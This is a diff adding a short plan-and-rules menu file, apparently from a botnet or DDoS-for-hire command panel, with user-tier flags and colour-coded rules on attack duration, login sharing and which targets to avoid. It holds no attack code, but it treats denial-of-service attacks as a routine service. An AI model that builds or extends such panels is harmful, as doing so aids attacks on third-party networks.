@@ -1,0 +1,12 @@
+name=rules
+description=users plan
+admin=false
+reseller=false
+vip=false
+==================== MENU SPLIT DONE ====================
+<<clear()>>
+\x1b[4m[38;2;0;255;0mR[38;2;0;255;4mu[38;2;0;254;8ml[38;2;0;254;12me[38;2;0;253;17m [38;2;0;253;21m1[0m: 250 Seconds Max On Bypass Methods
+\x1b[4m[38;2;0;255;0mR[38;2;0;255;4mu[38;2;0;254;8ml[38;2;0;254;12me[38;2;0;253;17m [38;2;0;253;21m2[0m: No Sharing Net Logins/Info
+\x1b[4m[38;2;0;255;0mR[38;2;0;255;4mu[38;2;0;254;8ml[38;2;0;254;12me[38;2;0;253;17m [38;2;0;253;21m3[0m: No Hitting .gov/.edu
+\x1b[4m[38;2;0;255;0mR[38;2;0;255;4mu[38;2;0;254;8ml[38;2;0;254;12me[38;2;0;253;17m [38;2;0;253;21m4[0m: No Hitting Dstats
+\x1b[4m[38;2;0;255;0mR[38;2;0;255;4mu[38;2;0;254;8ml[38;2;0;254;12me[38;2;0;253;17m [38;2;0;253;21m5[0m: No Attacking The Same IP Multiple Times
